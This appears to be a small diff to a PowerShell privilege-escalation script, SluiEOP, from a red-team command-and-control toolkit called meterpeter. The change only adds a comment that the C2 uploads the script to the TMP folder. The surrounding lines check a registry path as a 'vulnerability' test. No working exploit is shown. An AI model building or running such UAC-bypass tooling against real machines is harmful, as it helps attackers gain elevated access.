@@ -64,6 +64,7 @@ $CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
 If($CheckVuln -eq $True){
 
    ## For those who run SluiEOP outside meterpeter C2
+   # meterpeter C2 uploads SluiEOP.ps1 to $env:TMP (default)
    If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){
       Write-Host "SluiEOP v1.7 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
       Write-Host "[+] Executing Command: '$Command'"
